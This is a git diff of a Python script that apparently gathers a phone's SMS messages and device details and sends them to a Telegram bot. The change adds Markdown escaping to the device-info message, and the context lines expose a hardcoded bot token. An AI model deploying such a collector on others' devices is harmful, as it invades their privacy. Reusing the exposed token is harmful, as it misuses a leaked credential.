@@ -2,6 +2,7 @@ import os
 import requests
 import json
 import subprocess
+import re
 
 # Replace with your bot token and chat ID
 TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
@@ -26,6 +27,10 @@ def send_to_telegram(message):
             print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
     except Exception as e:
         print(f"Error sending message: {str(e)}")
+
+# Escape special characters for Markdown formatting in Telegram
+def escape_markdown(text):
+    return re.sub(r'([*_`\[\]])', r'\\\1', text)
 
 # Function to get SMS details
 def get_sms():
@@ -75,7 +80,8 @@ def get_device_info():
 
         # Format the device info for Telegram
         info_message = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
-        return info_message
+        escaped_message = escape_markdown(info_message)  # Escape Markdown special characters
+        return escaped_message
     except Exception as e:
         return f"Error retrieving device info: {str(e)}"
 
